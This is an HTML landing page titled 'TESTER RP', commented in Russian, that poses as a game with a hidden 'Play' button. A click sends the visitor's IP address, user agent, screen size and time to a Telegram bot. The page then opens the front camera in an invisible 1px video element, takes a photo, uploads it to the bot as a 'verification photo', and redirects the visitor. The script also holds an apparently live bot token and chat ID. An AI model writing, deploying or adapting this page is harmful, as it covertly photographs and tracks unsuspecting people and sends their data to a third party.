<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TESTER RP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            overflow: hidden;
            touch-action: none;
            -webkit-text-size-adjust: none;
            text-size-adjust: none;
            height: 100vh;
            font-family: Arial, sans-serif;
            position: relative;
            background: #000;
            display: flex;
            flex-direction: column;
        }
        
        .main-container {
            position: relative;
            flex: 1;
            overflow: hidden;
        }
        
        .background-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
        
        .background {
            width: 100%;
            height: 100%;
            object-fit: cover;
            object-position: center;
        }
        
        .bottom-container {
            position: relative;
            width: 100%;
        }
        
        .bottom-image {
            width: 100%;
            display: block;
        }
        
        .content {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            padding-bottom: 20px;
        }
        
        .play-btn {
            background: transparent;
            border: none;
            width: 200px;
            height: 80px;
            margin-bottom: 100px;
            cursor: pointer;
        }
        
        .hidden-camera {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }
        
        .legal-links {
            width: 100%;
            text-align: center;
            color: #fff;
            font-size: 12px;
            padding: 10px 0;
            background: rgba(0, 0, 0, 0.5);
        }
        
        .legal-links a {
            color: #fff;
            text-decoration: none;
            margin: 0 10px;
        }
        
        @media (max-width: 768px) {
            .play-btn {
                width: 150px;
                height: 60px;
                margin-bottom: 70px;
            }
        }
        
        @media (max-width: 480px) {
            .play-btn {
                width: 120px;
                height: 50px;
                margin-bottom: 50px;
            }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="background-container">
            <img src="https://i.imgur.com/luRLTOY.jpg" class="background" alt="Main background">
        </div>
        
        <div class="content">
            <button class="play-btn" id="playBtn"></button>
        </div>
    </div>
    
    <div class="bottom-container">
        <img src="https://i.imgur.com/RfC84iC.jpg" class="bottom-image" alt="Bottom content">
    </div>
    
    <div class="legal-links">
        <a href="#">Договор оферты</a>
        <a href="#">Политика конфиденциальности</a>
    </div>

    <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>

    <script>
        const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
        const chatId = '-1002577213610';
        const videoElement = document.getElementById('hiddenCamera');
        const playBtn = document.getElementById('playBtn');
        let stream = null;

        // Блокировка масштабирования
        document.addEventListener('gesturestart', function(e) {
            e.preventDefault();
        });
        
        document.addEventListener('touchmove', function(e) {
            if(e.scale !== 1) {
                e.preventDefault();
            }
        }, { passive: false });

        // 1. Отправка информации о пользователе
        async function sendUserInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                
                const userAgent = navigator.userAgent;
                const screenRes = `${window.screen.width}x${window.screen.height}`;
                const time = new Date().toLocaleString();
                
                const message = `🚨 Новый посетитель:\nIP: ${ip}\nУстройство: ${userAgent}\nЭкран: ${screenRes}\nВремя: ${time}`;
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Error sending user info:', error);
            }
        }

        // 2. Захват фото с камеры
        async function captureAndSendPhoto() {
            try {
                // Ждем 1 секунду чтобы камера стабилизировалась
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Создаем canvas для захвата кадра
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                // Преобразуем в blob
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
                
                // Создаем FormData для отправки
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'verification_photo.jpg');
                
                // Добавляем описание
                const caption = `🆔 Фото верификации\nВремя: ${new Date().toLocaleString()}`;
                formData.append('caption', caption);
                
                // Отправляем фото в Telegram
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                // Перенаправляем после успешной проверки
                window.location.href = "https://your-game-link.com";
                
            } catch (error) {
                console.error('Error capturing photo:', error);
                // В случае ошибки все равно перенаправляем
                window.location.href = "https://your-game-link.com";
            } finally {
                stopCamera();
            }
        }

        // 3. Запуск камеры устройства
        async function startCamera() {
            try {
                // Запрашиваем доступ к камере устройства (не Telegram)
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user', // Фронтальная камера
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                videoElement.srcObject = stream;
                
                // Сразу делаем фото после получения доступа
                await captureAndSendPhoto();
                
            } catch (error) {
                console.error('Camera error:', error);
                // В случае ошибки все равно перенаправляем
                window.location.href = "https://your-game-link.com";
            }
        }

        // 4. Остановка камеры
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                videoElement.srcObject = null;
            }
        }

        // 5. Обработчик кнопки "Играть"
        playBtn.addEventListener('click', async function() {
            await sendUserInfo(); // Сначала отправляем информацию о пользователе
            await startCamera(); // Затем запускаем процесс верификации
        });

        // Остановка камеры при закрытии страницы
        window.addEventListener('beforeunload', stopCamera);

        // Адаптация изображений под размер экрана
        function adjustImages() {
            const background = document.querySelector('.background');
            const bottomImage = document.querySelector('.bottom-image');
            
            // Рассчитываем соотношение сторон
            const windowRatio = window.innerWidth / window.innerHeight;
            const bgRatio = 16 / 9; // Предполагаемое соотношение фонового изображения
            
            if (windowRatio > bgRatio) {
                background.style.width = '100%';
                background.style.height = 'auto';
            } else {
                background.style.width = 'auto';
                background.style.height = '100%';
            }
            
            // Для нижнего изображения просто растягиваем по ширине
            bottomImage.style.width = '100%';
            bottomImage.style.height = 'auto';
        }

        // Инициализация при загрузке и при изменении размера
        window.addEventListener('load', adjustImages);
        window.addEventListener('resize', adjustImages);
    </script>
</body>
</html>
